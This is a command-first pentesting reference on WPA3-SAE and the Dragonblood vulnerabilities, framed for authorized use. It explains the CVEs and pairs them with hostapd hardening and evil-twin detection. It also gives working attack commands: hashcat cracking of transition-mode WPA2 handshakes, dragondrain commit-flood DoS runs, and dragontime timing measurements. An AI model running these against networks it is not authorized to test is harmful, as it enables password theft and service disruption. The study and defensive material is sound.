# WPA3-SAE (Dragonfly) & Dragonblood — Command-First Reference

> **Scope / authorization.** This file is for *authorized* work only: your own gear, a lab
> you control, sanctioned CTFs, or OSWP study. Everything below is framed defense-first —
> every attack is paired with the concrete defense. For evil-twin we cover **detection and
> concept only**; we do **not** build or document credential-harvesting portals.
>
> **The honest headline up front:** a correctly deployed **WPA3-Personal (SAE) network is
> not offline-crackable.** There is no hashcat mode for a WPA3-SAE PSK. If a tutorial shows
> you "cracking WPA3" with `hashcat -m 22000`, it is cracking the **WPA2 side of a
> transition-mode network**, not SAE. Your job as a tester is usually to *prove* SAE holds
> and to find the config/transition/firmware weaknesses around it — and to report a hardened
> SAE deployment as a **positive** finding.

---

## 1. Concept (brief)

**WPA2-PSK** authenticates with a 4-way handshake. Capture it (or the PMKID) and the PSK is
verifiable *offline* at GPU speed — the whole basis of `hashcat -m 22000`.

**WPA3-Personal** replaces that with **SAE — Simultaneous Authentication of Equals**, a
**Dragonfly** PAKE (Password-Authenticated Key Exchange, RFC 7664 / IEEE 802.11-2016 §12.4).
Two consequences matter:

1. **No offline dictionary attack.** A captured SAE exchange does **not** let you test
   password guesses offline. The PMK is derived per-session and is **not** a deterministic
   function of the PSK alone, so one capture yields nothing testable. Each guess requires a
   *fresh, interactive* handshake with the AP — guessing is **online-only**, and the AP can
   rate-limit / lock out.
2. **Forward secrecy.** Compromising the PSK later does not decrypt previously captured
   traffic.

### SAE handshake shape

```
            Commit  ──►   each side sends: scalar + element (point), derived from PWE
  STA  ◄── Commit         (PWE = "Password Element", a point/element in a cyclic group)
            Confirm ──►   each side proves it derived the same key (confirm hash over exchange)
       ◄── Confirm        → PMK established, then the normal 4-way handshake derives PTK
```

- **Group negotiation.** SAE runs in a finite cyclic group. **ECC group 19 = NIST P-256 is
  mandatory** and the most commonly used. Others: 20 = P-384, 21 = P-521; **MODP groups
  22/23/24** (finite-field); **Brainpool** curves. The group number drives which Dragonblood
  attack (if any) applies.
- **PWE derivation = the crux.** Two methods:
  - **Hunting-and-Pecking (H&P)** — the *original* method. Loop a counter, hash
    `(password, MAC_A, MAC_B, counter)`, test whether the output maps to a valid group
    element (for ECC: an x with a quadratic-residue y). **The number of iterations depends on
    the password and the two MACs** → variable work → **timing & cache side-channels**. This
    is what Dragonblood attacks. (Note: NIST curves themselves leak *no* timing info in H&P;
    the leaks are the **cache** branch on group 19, and **timing** on MODP/Brainpool.)
  - **Hash-to-Element (H2E)** — the *fixed*, **constant-time** method (SSWU map), added
    post-Dragonblood. Controlled by `sae_pwe`. Effectively mandatory on 6 GHz. This is the
    defense.

### Why SAE resists offline guessing (the security argument)

- The commit `scalar`/`element` are blinded by a random mask (`rand`/`mask`) in a
  discrete-log-hard group; a passive capture reveals nothing testable about the password.
- Verifying a guess means **completing a commit/confirm with the live AP** → online, rate-
  limited, loggable.
- **PMF (802.11w Management Frame Protection) is MANDATORY in WPA3** → forged deauth/disassoc
  are rejected, so you cannot cheaply force re-handshakes the way you do on WPA2.

---

## 2. The Dragonblood family (Vanhoef & Ronen, 2019) — what actually breaks

Dragonblood is **not** "WPA3 is cracked." It is a set of **implementation and transition-
design** weaknesses in the Dragonfly handshake (SAE *and* EAP-pwd). The paper's headline
offline result is **password partitioning**: the side-channels leak enough about the PWE
iteration count to split the dictionary, and the authors estimated **~$125 of EC2** to
recover an 8-char lowercase password. Verified CVE/attack map (primary sources:
`wpa3.mathyvanhoef.com`, `w1.fi/security/2019-1`, CERT VU#871675, NVD):

| # | Attack | Tracking | Needs | Reality on a modern target |
|---|--------|----------|-------|----------------------------|
| 1 | **Cache-based side-channel** on H&P hash-to-curve (ECC grp 19) | **CVE-2019-9494** | unprivileged code on the *victim's* device (malicious app / browser JS doing FLUSH+RELOAD) to learn which loop branch runs | Not an RF-only attack; mostly historical, patched by constant-time + H2E |
| 2 | **Timing side-channel** on H&P hash-to-group (MODP 22/23/24) | **CVE-2019-9494** | those MODP groups **enabled** (`sae_groups`) + RF range | **Off by default** everywhere → usually a dead end |
| 3 | **Brainpool timing leak** (encode step leaks iteration count even with WFA's first "fix") | **CVE-2019-13377** | Brainpool curve in use | Rare; defense = don't use Brainpool |
| 4 | **Password-partitioning** (turn leaked iteration/branch counts into an offline dictionary split) | *Dragonforce* tool | output of #1/#2/#3 | Only as strong as the leak feeding it |
| 5 | **Transition-mode downgrade** → WPA2 | **CERT VU#871675** | AP runs **WPA2+WPA3 transition**; rogue WPA2-only clone | **The realistic win.** The WPA3 client can be nudged to complete (part of) a WPA2 handshake → offline dict |
| 6 | **SAE security-group downgrade** (forge reject/decline so peer picks a weaker group) | **CERT VU#871675** | peer honors reject | Mitigated by downgrade protection; see 2024 note — still incomplete in 2.10 |
| 7 | **DoS / resource-consumption** — flood forged SAE **commit** frames; AP burns CPU on PWE per frame | **CERT VU#871675** (some refs: CVE-2019-9496) | RF range | A modest commit rate can overload an AP; anti-clogging bypassable |

> **EAP-pwd (same Dragonfly, WPA3-Enterprise-adjacent)** — out of scope for SAE-Personal but
> know it exists if the engagement touches 802.1X/EAP-pwd:
> - **CVE-2019-9495** — cache side-channel in hostapd/wpa_supplicant EAP-pwd
> - **CVE-2019-9497** — reflection attack (hostapd/wpa_supplicant)
> - **CVE-2019-9498** — invalid-curve attack on the **hostapd server** → auth bypass
> - **CVE-2019-9499** — invalid-curve attack on the **wpa_supplicant client** → server impersonation
> - **CVE-2019-11234** — reflection attack in **FreeRADIUS**
> - **CVE-2019-11235** — invalid-curve attack on the **FreeRADIUS server** → auth bypass
> - **CVE-2019-13456** — FreeRADIUS info leak: aborts when >10 iterations are needed, leaking iteration count
> - Tool: **Dragonslayer** (invalid-curve attacks against EAP-pwd; attacker needs only a valid username).

### 2024 follow-up you MUST know (don't report "fixed in 2019")

**SAE-H2H / incomplete group-downgrade protection (w1.fi 2024-2, published 2024-07-31).**
Even with **H2E enabled**, hostapd/wpa_supplicant **2.10** mishandle the *Rejected Groups*
element, so an attacker can modify SAE commit frames to **force the negotiated group down to
another enabled group**. Conditions (all must hold):

- `CONFIG_SAE=y` built and enabled;
- **H2E enabled** — `sae_pwe` = 1 or 2, *or* SAE password identifiers in use;
- `sae_groups` lists **more than one** group.

Defaults that matter: **hostapd** defaults `sae_groups` to a *single* group (so an AP is only
exposed if explicitly reconfigured), but **wpa_supplicant** defaults to groups **19, 20, 21**
(so the client side is exposed out of the box when talking to a vulnerable hostapd). H2E is
**not** on by default; plain hunting-and-pecking has *no* group-downgrade protection at all,
so the issue is specifically about H2E's protection being incomplete.

**Fix:** update to **2.11+**, or backport+rebuild these three upstream commits:
- `364c2da8741f…` — SAE: Check for invalid Rejected Groups element length explicitly
- `593a7c2f8c93…` — same, applied on the STA side
- `9716bf1160be…` — SAE: Reject invalid Rejected Groups element in the parser

Credit: M. D. Pirwani Dar & O. Chowdhury (Stony Brook), M. Vanhoef (KU Leuven).

Also current: **SSID Confusion (CVE-2023-52424)** — clients can be tricked about *which*
SSID they authenticated to (the SSID isn't always in the key derivation). When you fingerprint
a target, record the **hostapd/wpa_supplicant/iwd version**, not just "is it WPA3."

---

## 3. Recon first — identify *exactly* what you're facing (this decides everything)

You cannot pick an approach until you know: **SAE or not? transition or WPA3-only? which
groups? PMF required? 6 GHz (forces H2E)? what firmware/version?**

### 3a. Scan and read the AKM / RSN IE

```bash
# Put the TP-Link RTL8188EUS into monitor mode (airmon-ng kills interfering procs)
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # -> wlan0mon  (or use iw: see note)
# iw alternative:
#   sudo ip link set wlan0 down; sudo iw wlan0 set monitor control; sudo ip link set wlan0 up

# Survey. airodump shows the AUTH/AKM column: PSK (WPA2), SAE (WPA3), or "SAE PSK" (transition)
sudo airodump-ng wlan0mon --band bg          # 2.4 GHz only — matches the RTL8188EUS
# Watch the ENC/AUTH columns:  WPA2 ... PSK   = WPA2 only
#                              WPA3 ... SAE   = WPA3 only  (what you WANT to confirm)
#                              WPA2 WPA3 ... SAE PSK = TRANSITION  (the soft target)
```

Decode the RSN Information Element precisely with `iw` (the AKM suite selector tells the truth):

```bash
sudo iw dev wlan0 scan | grep -A25 'SSID: TARGET_SSID'
# In the "RSN:" block read:
#   * Authentication suites: PSK            -> 00-0F-AC:2  = WPA2-PSK
#   * Authentication suites: SAE            -> 00-0F-AC:8  = WPA3-SAE
#   * Authentication suites: FT/SAE         -> 00-0F-AC:9  = fast-transition SAE (roaming)
#   * Authentication suites: 00-0f-ac:24    = SAE-EXT-KEY  (H2E-capable; signals H2E support)
#   * Capabilities: ... MFPR (required) / MFPC (capable)  -> PMF state
#     MFPR set  = PMF REQUIRED  -> this is real WPA3 (deauth won't work)
#     MFPC only = PMF optional  -> transition-ish, deauth may still work
```

Fast one-liner to flag transition APs (both PSK **and** SAE present = downgrade surface):

```bash
sudo iw dev wlan0 scan | awk '/SSID:/{s=$2} /Authentication suites:/{print s": "$0}'
```

### 3b. bettercap (richer live view, good for logging)

```bash
sudo bettercap -iface wlan0
# » wifi.recon on
# » set wifi.show.manufacturer true
# » wifi.recon.channels 1,6,11
# » wifi.show            # AUTH column shows WPA2/WPA3/SAE; note PMF / clients
```

### 3c. hcxdumptool can *see* SAE but cannot *crack* it

```bash
# Capture everything on 2.4 GHz for later inspection (authorized networks only)
sudo hcxdumptool -i wlan0 -w lab.pcapng -F --rds=1
# Convert / inspect:
hcxpcapngtool -o lab.22000 --all lab.pcapng
#   -> For WPA2 APs you may get PMKID/EAPOL lines (mode 22000 = crackable).
#   -> For a pure WPA3-SAE AP you will see the AP flagged, but NO 22000 hash is produced,
#      because hashcat has no hash mode for a WPA3-SAE PSK. SAE frames != crackable hash.
```

**Gotcha:** some builds/wikis label SAE frames in output — that is *detection*, not a
crackable handshake. Don't waste GPU time on it. (Confirmed on hashcat forums: hcxpcapngtool
does not emit a convertible hash for WPA3 captures because there is no WPA3-PSK hash mode.)

---

## 4. Decision order — what pros actually try, in order

```
1. RECON:  SAE? transition or WPA3-only? PMF required? groups? 6GHz? firmware version?
              │
2. TRANSITION MODE present (WPA2+WPA3)?
      YES ─►  Attack the WPA2 side. This is almost always the only realistic offline win.
              a) Grab PMKID:        hcxdumptool -> hcxpcapngtool -> hashcat -m 22000
              b) or 4-way handshake on a WPA2-capable client
              c) Transition-downgrade: a WPA2-only clone of the SSID (same password space);
                 the WPA3 client's WPA2 handshake is enough for an offline dict attack.
                 DETECTION framing for others' nets; do this only on YOUR OWN gear.
      NO  ─►  continue
              │
3. WPA3-ONLY:  offline cracking is generally INFEASIBLE. Evaluate, in order:
      a) Firmware/impl age: hostapd/wpa_supplicant/iwd < 2.11? sae_pwe=0 (H&P only)?
         Dragonblood-era exposure, group-downgrade (2024-2), SSID confusion (CVE-2023-52424)?
      b) Weak groups enabled? sae_groups includes 22/23/24 or Brainpool? (timing) — rare.
      c) Client-side side-channel (CVE-2019-9494 cache): only if you can run code on the
         client. Out of scope for pure-RF; note as a client-hardening finding.
      d) DoS resilience test (dragondrain) — authorized stress test only, Atheros NIC.
      e) Online guessing: rate-limited + noisy + PMF blocks deauth → essentially not viable.
              │
4. DOCUMENT:  "Pure SAE could not be offline-cracked" is a POSITIVE finding. Report the
              transition/firmware/password-policy posture, not a cracked PSK.
```

---

## 5. Tooling — exact commands

### 5a. The WPA2-side path (for transition targets) — your real crack path

```bash
# 1) Capture PMKID / EAPOL (authorized AP). --rds gives a readable realtime display.
sudo hcxdumptool -i wlan0 -w cap.pcapng -F
#    (older syntax used --enable_status=1 / filterlists; check your hcxdumptool version)

# 2) Convert to hashcat 22000  (22000 = WPA-PBKDF2-PMKID+EAPOL; replaces old 2500/16800)
hcxpcapngtool -o target.22000 cap.pcapng

# 3) Crack on the Mac GPU (Metal). 
hashcat -m 22000 target.22000 wordlist.txt -r rules/best64.rule -w 3
#    Mask example (phone-number / known-pattern PSKs):
hashcat -m 22000 target.22000 -a 3 ?d?d?d?d?d?d?d?d
```

This only works because transition mode *also* speaks WPA2. On a WPA3-only AP there is no
22000 hash to produce. Modes 2500/16800 are deprecated — always use 22000.

### 5b. Dragondrain — DoS resilience test (YOUR AP only)

> **Hardware reality for your kit:** dragondrain/dragontime are **Atheros-only** — they need
> the target card to **ACK frames sent to spoofed MACs**, which the author only implemented
> for Atheros, via the **`ath_masker`** kernel module (`github.com/vanhoefm/ath_masker`,
> load it *before* plugging in the dongle). The **TP-Link RTL8188EUS is NOT supported** by
> these PoCs — it is your capture/monitor/injection NIC for airodump/hcxdumptool/bettercap,
> not for these two tools.
>
> **Compatible cards (from the repo README):** *tested* — **Alfa AWUS036NHA**; *expected but
> untested* — TL-WN721N, Sony UWA-BR100; *older / hard to find* — WNDA3200, **TP-Link WN722N
> v1** (the **v2 is NOT compatible** — it dropped the Atheros chip). Use an AR9271-class card
> (AWUS036NHA / WN722N v1) to reproduce DoS/timing results.

```bash
# Build (Kali)
sudo apt-get update
sudo apt-get install autoconf automake libtool shtool libssl-dev pkg-config
autoreconf -i && ./configure && make

# Disable NetworkManager's Wi-Fi first, then unblock so the tool can use the card
sudo rfkill unblock wifi
sudo ifconfig wlan0 down
sudo iw wlan0 set type monitor
sudo ifconfig wlan0 up

# Minimal clogging test against YOUR AP (-d iface, -a AP MAC)
./dragondrain -d wlan0 -a AA:BB:CC:DD:EE:FF

# Realistic runs:
./dragondrain -d wlan0 -a AA:BB:CC:DD:EE:FF -c 6 -b 54 -n 1  -r 200   # single-MAC, anti-clog test
./dragondrain -d wlan0 -a AA:BB:CC:DD:EE:FF -c 6 -b 54 -n 20 -r 200   # 20 spoofed MACs
./dragondrain -d wlan0 -a AA:BB:CC:DD:EE:FF -c 6 -b 54 -n 20 -r 40 -g 21   # P-521 → fewer handshakes needed
./dragondrain -d wlan0 -a AA:BB:CC:DD:EE:FF -c 6 -g 19 -b 54 -n 1  -M      # experimental queue-defense mode
#   -c channel  -b inject bitrate  -n #spoofed MACs  -r handshakes/sec (default 25)
#   -g group (19=P-256, 21=P-521 costs the AP more per frame)
#   -M (experimental) target hostapd's queuing defense   -m send malformed commit after each handshake
#   -h  list all parameters
```

**Gotcha (single-MAC):** a single-MAC attack only bypasses anti-clogging if you wait a few
minutes after a previous run, because hostapd may still be tracking the old handshakes.
**Interpreting success:** anti-clogging is bypassed when forged-handshakes/sec stays high
while anti-clogging (AC) tokens received ≈ 0.

### 5c. Dragontime — timing attack PoC (YOUR AP, needs MODP 22/23/24 enabled)

```bash
./dragontime -d wlan0 -c 1 -a 11:22:33:44:55:66 -g 27 -i 250 -t 750 -o measurements.txt
#   -g group (example 27; targets MODP 22/23/24-class)  -i ms to wait after reply to spoofed commit
#   -t retransmit timeout ms (resend spoofed commit if no reply)  -o timing samples
#   (README notes the full flag set isn't documented — run ./dragontime -h to confirm the rest)
```

Mostly instructive: if your AP doesn't enable those MODP groups (default), there's nothing to
measure — which is the point. Plot/stat the samples to look for a detectable timing gap.

### 5d. Dragonforce — password partitioning (experimental)

Consumes the timing/cache measurements from the above and runs a **partitioning** (dictionary-
like) attack to narrow the password space. It is only as good as the leak feeding it; against
a patched, H2E, strong-password AP it yields nothing. (This is the tool that realizes the
paper's "~$125 EC2 for 8-char lowercase" estimate — but *only* given a usable leak.)

---

## 6. Gotchas & pitfalls (where testers waste hours)

- **No hashcat mode for WPA3-SAE PSK.** A captured SAE handshake is not a crackable hash. Any
  "WPA3 crack" using `-m 22000` is really attacking the **WPA2 transition** handshake.
- **PMKID attack does not apply to SAE.** WPA3 PMKID is derived differently and SAE doesn't
  hand it to a passive sniffer the way WPA2 does.
- **PMF is mandatory in WPA3** → `aireplay-ng --deauth` and mdk4 deauth are rejected. You
  cannot force an SAE re-handshake with forged deauth on a WPA3-only AP. (On *transition* APs
  the WPA2 clients may still be deauthable — that's the opening.)
- **Timing attacks need MODP 22/23/24** which are **disabled by default** in
  hostapd/wpa_supplicant and virtually all consumer APs → usually not exploitable.
  **NIST curves leak no timing info** in H&P — so group 19 timing is a non-issue; the group-19
  exposure was the **cache** attack, which needs code on the victim.
- **Cache attack (CVE-2019-9494) needs code execution on the victim's own device.** It is a
  client-hardening issue, not something you do over the air.
- **Brainpool still leaks** even after the Wi-Fi Alliance's original H&P "defense" — the only
  real fix is H2E / avoiding Brainpool.
- **Cypress chips run ≥8 H&P iterations** as a mitigation — makes the leak harder to exploit
  but does **not** eliminate it.
- **6 GHz forces H2E** (hostapd auto-sets `sae_pwe=2` for SAE on 6 GHz when unset) → the H&P
  timing/cache class is closed there by design.
- **"Patched in 2019" is wrong.** Group-downgrade protection was still **incomplete in 2.10**
  (fixed 2.11, w1.fi/security/2024-2), and SSID Confusion (CVE-2023-52424) is 2023/2024.
  Always fingerprint the **version**.
- **Atheros-only PoCs.** Don't burn time trying to run dragondrain/dragontime on the
  RTL8188EUS — wrong chipset, no `ath_masker`.
- **airodump band flag.** The RTL8188EUS is 2.4 GHz only; `--band a` scans show nothing. Many
  WPA3 nets (esp. 6 GHz / WPA3-only) won't even be visible on this NIC — note that limit in
  findings.

---

## 7. Pro tips for speed

- **Spend your first minutes on recon, not attacks.** The single question "transition or
  WPA3-only?" determines whether there's *any* offline path. Use the `awk` one-liner in §3a.
- **Transition target → go straight for the WPA2 PMKID** (fastest hash to obtain), then throw
  your best wordlist + rules at the Mac GPU. Don't touch the SAE frames.
- **Keep an RSN-IE cheat sheet**: AKM `00-0F-AC:8` = SAE, `:9` = FT-SAE, `:2` = PSK,
  `:24` = SAE-EXT-KEY (H2E); MFPR bit = PMF required. Reading this correctly saves you from
  chasing an uncrackable AP.
- **Fingerprint firmware early** (banner/OUI/behavior/version) to decide whether any
  Dragonblood-era or 2024 downgrade issue is even in play.
- **On WPA3-only, reframe the goal**: your deliverable is a *posture assessment* (transition
  off? H2E on? 2.11+? strong passphrase? PMF required? DoS-resilient? SAE-PK for public nets?),
  not a cracked PSK.

---

## 8. DEFENSE (paired to each attack) — the point of the exercise

| Threat | Defense |
|--------|---------|
| Transition downgrade → WPA2 (#5) | **Disable transition mode; run WPA3-only** once clients support it. This removes the WPA2 handshake entirely. Proposed standard fix: an RSNE flag signalling "all APs are WPA3" so clients can refuse downgrade. |
| SAE group downgrade (#6) | Update to **hostapd/wpa_supplicant 2.11+** (completes group-downgrade protection; 2.10 was still incomplete per w1.fi 2024-2). Prefer a **single group (19)** in `sae_groups`. |
| H&P cache/timing (#1–#3) | **Enable H2E**: `sae_pwe=2` (H2E + H&P, backward-compatible) or `sae_pwe=1` (H2E only, where all clients support it). **Remove MODP 1,2,5,22,23,24 and Brainpool** from `sae_groups`; keep `sae_groups=19`. 6 GHz enforces H2E automatically. Patch to constant-time builds (≥2.8 for the 2019 fix: the `is_quadratic_residue_blind()` / constant-memory-access patches). |
| Password partitioning (#4) | **High-entropy passphrase** (long, random). Even a residual leak can't brute a strong space. |
| SAE commit-flood DoS (#7) | Process commit frames in a **low-priority background thread**; enable **anti-clogging tokens**; patch; **WIDS alert on commit floods**. (Paper warns variants remain possible.) |
| Forged deauth / mgmt spoofing | **PMF required** (default in WPA3) — keep MFPR set; `sae_require_mfp=1`. |
| Public/open WPA3 impersonation | **SAE-PK** (public-key-authenticated SAE) so clients verify the AP's public key, defeating evil-twin of public/known WPA3 networks. For truly open nets, **OWE (Enhanced Open)** gives encryption but **not** AP authentication — it is roughly open-network risk against an active attacker, so don't treat OWE as evil-twin protection. |
| EAP-pwd invalid-curve / reflection (enterprise) | Discard points not on the curve and the point at infinity; abort if a peer's scalar+element equal your own; patch FreeRADIUS/hostapd. |

### Hardened hostapd snippet (reference)

```ini
wpa=2
wpa_key_mgmt=SAE            # SAE only (no WPA2 PSK fallback = no transition)
rsn_pairwise=CCMP
ieee80211w=2               # PMF REQUIRED
sae_require_mfp=1
sae_pwe=1                  # H2E only (use 2 if some clients still need H&P)
sae_groups=19             # NIST P-256 only; drop MODP/Brainpool  (single group also dodges 2024-2)
# keep hostapd >= 2.11
# sae_pwe semantics: 0 = hunting-and-pecking only; 1 = H2E only; 2 = both (H2E + H&P).
# On 6 GHz, hostapd auto-sets sae_pwe=2 for SAE when unset.
```

Verify from the client side that it really is hardened:

```bash
sudo iw dev wlan0 scan | grep -A25 'SSID: YOUR_SSID'
#   Want to see: Authentication suites: SAE   (no PSK line = no transition)
#                RSN capabilities: ... MFPR    (PMF required)
```

---

## 9. Evil-twin / downgrade — DETECTION ONLY (never a harvester)

Monitor for, and alert on, the *signatures* an evil-twin / transition-downgrade leaves — do
not stand up a credential portal.

**Classic indicators to watch:**
- **Duplicate SSID on a different BSSID**, especially one advertising **weaker AKM**
  (PSK/WPA2 when the real AP is SAE) or **PMF not required (MFPR clear)** — the textbook
  transition-downgrade clone.
- **IE / fingerprint mismatch** between the real and rogue beacon: information-element
  **ordering**, vendor-specific IEs, supported-rates, capability bits, and **beacon timing
  interval** differences are the features a WIDS/ML detector keys on (one peer-reviewed
  study reports ~99.8% detection with a Naive Bayes classifier on these features; a 2026
  multi-signal audit framework reports ~95% precision at ~4% false positives — single,
  not-yet-replicated results, so treat the exact figures as indicative).
- **RSSI / location inconsistency** (clone transmitting from a different position/power).
- **Deauth/disassoc anomalies** against clients (precursor to forcing a WPA2 downgrade).
- **SAE commit floods** (the DoS signature).
- **Unexpected group-reject / decline frames** (group-downgrade attempt).

```bash
# Lightweight rogue/clone watch: list every BSSID advertising your SSID, with its AKM & PMF.
sudo airodump-ng wlan0mon --essid "YOUR_SSID"     # >1 BSSID for your SSID = investigate

# Continuous WIDS: Kismet alerts + a bettercap wifi.recon log diffed against a known-good
# BSSID/AKM/PMF baseline. Treat any NEW BSSID or WEAKER-AKM pairing for your SSID as an
# incident to investigate — not a target to clone.
```

**Defender's bottom line:** the single most effective control against the whole evil-twin /
transition-downgrade class is **turning transition mode off (WPA3-only) with PMF required**,
plus client-side "only connect to WPA3" policies where the device supports it. SAE-PK closes
the gap for public/known networks where clients can't pre-share a secret.

---

## Sources

**Primary sources fetched directly for this file:**
- Dragonblood official project page — https://wpa3.mathyvanhoef.com/ (full CVE map, CERT VU#871675, tool list Dragonslayer/Dragondrain/Dragontime/Dragonforce, affected curves/groups, defenses)
- dragondrain-and-time tool repo README (exact build, `ath_masker`, Atheros-only chipset list, all flags, examples) — https://github.com/vanhoefm/dragondrain-and-time
- w1.fi 2019-1 SAE side-channel advisory (cache vs timing, group 19 vs MODP 22/23/24, `is_quadratic_residue_blind()` constant-time fix, `sae_groups` guidance, ≥2.8) — https://w1.fi/security/2019-1/sae-side-channel-attacks.txt
- w1.fi 2024-2 advisory — SAE H2E incomplete group-downgrade protection (2.10 affected, conditions, hostapd vs wpa_supplicant `sae_groups` defaults, three backport commits, fixed 2.11) — https://w1.fi/security/2024-2/sae-h2h-and-incomplete-downgrade-protection-for-group-negotiation.txt
- hostapd mailing-list patch — enable H2E (`sae_pwe=2`) on 6 GHz when SAE is used — https://lists.infradead.org/pipermail/hostap/2022-November/041096.html

**Academic / conference:**
- Dragonblood paper (Vanhoef & Ronen), PDF — https://papers.mathyvanhoef.com/dragonblood.pdf (mirror: https://dl.aircrack-ng.org/wiki-files/doc/additional_papers/dragonblood.pdf)
- Black Hat USA 2019 whitepaper — https://i.blackhat.com/USA-19/Wednesday/us-19-Vanhoef-Dragonblood-Attacking-The-Dragonfly-Handshake-Of-WPA3-wp.pdf
- "A machine learning approach for detecting WPA3 downgrade attacks" (detection features, classifiers, accuracy) — https://pmc.ncbi.nlm.nih.gov/articles/PMC12404434/

**CVE / advisory corroboration:**
- NVD CVE-2019-9494 — https://nvd.nist.gov/vuln/detail/CVE-2019-9494
- The Hacker News (CVE-2019-13377 Brainpool timing; CVE-2019-13456 FreeRADIUS) — https://thehackernews.com/2019/08/hack-wpa3-wifi-password.html
- SecurityWeek, Dragonblood overview — https://www.securityweek.com/dragonblood-flaws-wpa3-allow-recovery-wi-fi-passwords/
- SC Media / SC World, Dragonblood — https://www.scworld.com/news/dragonblood-flaws-in-wpa3-protocol-could-help-adversaries-recover-passwords
- Security Affairs, Dragonblood — https://securityaffairs.com/?p=89348

**Tooling / config references:**
- hashcat forum — WPA3-SAE has no hashcat mode; hcxpcapngtool emits no convertible WPA3 hash; 22000 replaces 2500/16800 — https://hashcat.net/forum/thread-10253.html and https://hashcat.net/forum/thread-12080.html
- hostapd `sae_pwe` semantics (0=H&P, 1=H2E, 2=both) and OpenWrt defaults — https://lists.infradead.org/pipermail/hostap/2024-July/042856.html
- SecureW2 — WPA3 transition-mode evil-twin downgrade (detection/mitigation framing) — https://securew2.com/signal/wpa3-hack-evil-twin-downgrade-why-transition-mode-keeps-wifi-vulnerable
- SpecterOps — attacks against WPA3 Enhanced Open (OWE) context — https://specterops.io/blog/2020/02/12/war-never-changes-attacks-against-wpa3s-enhanced-open-part-3-owe-nearly-indistinguishable-from-open-wireless-in-terms-of-risk/
- HackTricks, Pentesting Wi-Fi (recon/AKM/transition framing) — https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi
- Aruba/HPE WPA3-Personal docs (transition-off guidance, `sae_pwe`, H2E, 6 GHz) — https://arubanetworking.hpe.com/techdocs/aos/wifi-design-deploy/security/modes/wpa3-personal/

*Compiled 2026-11-14 for the Wi-Fi Command Center knowledge base (authorized testing only).*
